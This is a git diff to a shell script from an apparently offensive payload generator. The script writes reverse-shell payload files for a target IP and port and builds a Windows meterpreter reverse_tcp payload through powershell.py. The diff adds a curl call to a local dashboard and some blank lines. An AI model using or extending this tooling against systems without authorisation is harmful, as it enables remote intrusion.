@@ -64,6 +64,7 @@ fi
 
 
 echo "[+] Take your time for some excessive handcrafted reverse shells with love and minimal care for ${IP} on port ${PORT}"
+curl "http://127.0.0.1/dashboard/zet_ip/${IP}"
 echo "[.] Now baking BASH reverse TCP shells..."
 echo '# Incompetent Bastard' > http/payloads/${BESTAND}_${PORT}.txt
 echo 'Excessive handcrafted reverse shells with love and minimal care.' >> http/payloads/${BESTAND}_${PORT}.txt
@@ -144,6 +145,8 @@ echo './command.sh metasploit msfshell_tcp' >> http/payloads/${BESTAND}_${PORT}.
 echo "[.] Building the prefered shells :)"
 echo '# POWERSHELL' >> http/payloads/${BESTAND}_${PORT}.txt
 echo '[powershellplaceholder]' >> http/payloads/${BESTAND}_${PORT}.txt
+
+
 python3 powershell.py ${IP} ${PORT} windows/x64/meterpreter/reverse_tcp http/payloads/${BESTAND}_${PORT}.txt
 
 
